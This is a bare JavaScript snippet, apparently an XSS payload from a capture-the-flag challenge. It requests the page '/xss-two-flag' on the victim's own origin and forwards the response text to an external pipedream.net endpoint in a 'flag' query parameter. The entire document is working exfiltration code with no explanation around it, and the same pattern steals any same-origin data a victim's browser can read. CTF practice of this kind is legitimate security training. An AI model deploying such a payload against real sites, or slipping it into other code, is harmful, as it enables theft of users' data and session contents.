var xhr = new XMLHttpRequest();
xhr.open('GET',location.origin + '/xss-two-flag',true);
xhr.onload = function () {
var request = new XMLHttpRequest();
request.open('GET','https://eom6hzyuukgbktj.m.pipedream.net/?flag=' + xhr.responseText,true);
request.send()};
xhr.send(null);
